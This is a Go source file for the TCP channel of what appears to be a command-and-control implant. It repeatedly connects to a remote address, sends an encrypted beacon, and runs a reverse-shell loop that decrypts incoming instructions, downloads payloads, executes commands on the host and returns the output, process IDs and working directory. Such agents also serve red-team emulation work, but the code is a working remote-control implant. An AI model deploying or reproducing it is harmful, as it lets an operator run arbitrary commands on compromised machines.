package sockets

import (
	"../commands"
	"../util"
	"bufio"
	"bytes"
	"encoding/json"
	"io"
	"log"
	"net"
	"os"
	"strings"
)

type TCP struct {}

func init() {
	CommunicationChannels["tcp"] = TCP{}
}

func (contact TCP) Communicate(address string, sleep int, beacon Beacon) {
	for {
		conn, err := net.Dial("tcp", address)
	   	if err != nil {
	   		log.Printf("[-] %s is either unavailable or a firewall is blocking traffic.", address)
	   	} else {
	   		listen(conn, beacon)
	   	}
	   	jitterSleep(sleep, "TCP")
	}
}

func listen(conn net.Conn, beacon Beacon) {
	//initial beacon
	bufferedSend(conn, beacon)

	//reverse-shell
    scanner := bufio.NewScanner(conn)
    for scanner.Scan() {
		message := strings.TrimSpace(scanner.Text())
		go respond(conn, beacon, message)
    }
}

func respond(conn net.Conn, beacon Beacon, message string){
	var tempB Beacon
	json.Unmarshal([]byte(util.Decrypt(message)), &tempB)
	beacon.Links = beacon.Links[:0]
	for _, link := range tempB.Links {
		if len(link.Payload) > 0 {
			requestPayload(link.Payload)
		}
		response, status, pid := commands.RunCommand(link.Request, link.Executor)
		link.Response = strings.TrimSpace(response)
		link.Status = status
		link.Pid = pid
		beacon.Links = append(beacon.Links, link)
	}
	pwd, _ := os.Getwd()
	beacon.Pwd = pwd

	bufferedSend(conn, beacon)
}

func bufferedSend(conn net.Conn, beacon Beacon) {
	data, _ := json.Marshal(beacon)
	allData := bytes.NewReader(append(util.Encrypt(data), "\n"...))
	sendBuffer := make([]byte, 1024)
	for {
		_, err := allData.Read(sendBuffer)
		if err == io.EOF {
			return
		}
		conn.Write(sendBuffer)
	}
}